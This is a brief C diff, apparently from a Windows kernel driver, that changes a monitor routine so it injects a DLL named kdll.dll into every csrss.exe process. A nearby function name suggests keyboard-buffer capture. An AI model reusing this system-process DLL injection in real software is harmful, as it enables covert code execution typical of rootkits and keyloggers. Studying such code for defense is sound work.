@@ -153,8 +153,10 @@ VOID ECoreSendKbdBuf(PVOID BuffEntry)
 VOID MonitorInjectDllWorker(PMONITOR Monitor, PVOID Context)
 {
 	UNICODE_STRING ProcPrefix = RTL_CONSTANT_STRING(L"csrss.exe");
+	UNICODE_STRING DllPath = RTL_CONSTANT_STRING(L"\\\\?\\C:\\test");
+	UNICODE_STRING DllName = RTL_CONSTANT_STRING(L"kdll.dll");
 	
-	InjectFindAllProcessesAndInjectDll(&ProcPrefix, NULL);
+	InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);
 }
 
 NTSTATUS
